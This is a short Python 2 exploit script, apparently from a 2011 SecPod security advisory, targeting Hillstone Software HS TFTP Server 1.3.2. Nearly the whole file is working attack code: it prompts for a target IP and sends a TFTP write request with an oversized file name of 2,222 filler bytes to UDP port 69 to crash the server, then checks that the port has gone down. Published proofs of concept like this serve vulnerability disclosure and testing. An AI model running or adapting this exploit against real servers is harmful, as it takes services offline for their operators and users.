#!/usr/bin/python
##############################################################################
# Title     : Hillstone Software HS TFTP Server Denial Of Service Vulnerability
# Author    : Prabhu S Angadi from SecPod Technologies (www.secpod.com)
# Vendor    : http://www.hillstone-software.com/hs_tftp_details.htm
# Advisory  : http://secpod.org/blog/?p=419
#             http://secpod.org/advisories/SecPod_Hillstone_Software_HS_TFTP_Server_DoS.txt
#             http://secpod.org/exploits/SecPod_Exploit_Hillstone_Software_HS_TFTP_Server_DoS.py
# Version   : Hillstone Software HS TFTP 1.3.2
# Date      : 02/12/2011
##############################################################################

import socket,sys,time

port   = 69
target = raw_input("Enter host/target ip address: ")

if not target:
    print "Host/Target IP Address is not specified"
    sys.exit(1)

print "you entered ", target

try:
    socket.inet_aton(target)
except socket.error:
    print "Invalid IP address found ..."
    sys.exit(1)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
except:
    print "socket() failed"
    sys.exit(1)

## File name >= 222 length leads to crash
exploit = "\x90" * 2222

mode = "binary"
print "File name WRITE/READ crash"

## WRITE command = \x00\x02
data = "\x00\x02" + exploit + "\0" + mode + "\0"

## READ command = \x00\x01
## data = "\x00\x01" + exploit + "\0" + mode + "\0"

sock.sendto(data, (target, port))
time.sleep(2)
sock.close()
try:
    sock.connect()
except:
    print "Remote TFTP server port is down..."
    sys.exit(1)
